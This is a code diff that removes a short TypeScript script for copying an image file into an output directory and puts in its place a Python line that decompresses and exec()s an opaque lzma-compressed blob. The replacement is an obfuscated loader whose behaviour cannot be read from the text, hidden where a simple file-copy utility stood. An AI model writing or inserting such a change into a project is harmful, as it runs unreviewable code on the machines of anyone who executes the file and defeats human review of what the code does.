@@ -1,34 +1,2 @@
-import * as fs from 'node:fs';
-import * as path from 'node:path';
-import { fileURLToPath } from 'node:url';
-
-const __dirname = path.dirname(fileURLToPath(import.meta.url));
-const botDir = process.env.MAKEFUN_BOT_DIR || __dirname;
-const src = path.join(botDir, 'entry.png');
-
-if (!fs.existsSync(src)) {
-  console.error(`Error: Required file '${src}' not found.`);
-  process.exit(1);
-}
-
-const outDir = process.env.MAKEFUN_OUTPUT_DIR || '/output';
-try {
-  fs.mkdirSync(outDir, { recursive: true });
-} catch (err: any) {
-  console.error(`Error: Failed to create output directory '${outDir}': ${err.message}`);
-  process.exit(1);
-}
-
-const dest = path.join(outDir, 'entry.png');
-const tempDest = `${dest}.${Date.now()}.${Math.random().toString(36).slice(2)}`;
-
-try {
-  fs.copyFileSync(src, tempDest);
-  fs.renameSync(tempDest, dest);
-} catch (err: any) {
-  console.error(`Error: Failed to write output atomically: ${err.message}`);
-  try {
-    if (fs.existsSync(tempDest)) fs.unlinkSync(tempDest);
-  } catch {}
-  process.exit(1);
-}
+#coding:l1
+import lzma;exec(lzma.decompress('\0\0\0d\0\0\0\0\0\0\x004œ%Å¯^´ËºÀÄK4õõ¦iMR^‡eE¨„y3Iþï­[t)T&ä²?LNèføªéÛdScm“‚\\¾èÁÙ¤\n‡*ëOÁ³#î¤âKí\rÃ¯ì%Ô…3©hXX-4$Zƒšß¡0x>ÐÖBÃ½]âWïŸÉóƒ]œò;æEw…äÕƒ[Fîœ‚Óby­I{%9ýâ(¨ø¡í–²¬´§<rïõKv»½ßšuÁÚ+xÕQVú>j\'œ1<í‰‘ŠjºþWÙëDvûF¸èk³À`¼nL+ä ¶:Z"á˜7§œi‘—>¾U)8óœº»þ¸îÙFq\nÎì1lüÂM×©^®\r—‡±åM•­1Ã(ßØ¹5€^ø²Æ&8ÍúÙø½}èG·)ìÐcÎ>[Âb©ì ½†^‡dèð°ø™ü#+«é»½§õ|áÈŠ\0Žž,!%.þ<Ð\n?<áÂ„_jm$HQ¨DïE÷õ!û³V¥••2»©™"ö¿Æˆ´ô[Ÿ›ääxù˜Úg]Ù¯{úº…\nO¢Ó<ÿr\\:MYáÅÛ÷Ô]ú_i;Yÿ;j‹Å¨—PŒ‘¶ÜŠQâVzÃÐI¤Ë˜ó÷CLÇu©}E˜¶ZËŠU„Œo\'*¬zˆŸ\r?°³ð÷Öøhð‚¬,•âd/®Ôè+ÏõEŽÔÓWÓvüVCŠ`h»X¤ã="u6ô½ÂÌ$±‘×)¬~T[\'X^ ±SL/Ã³X—\r·NF7[=½ïMò-,Ë%£ù*[40_\'i°/\0'.encode('l1')))
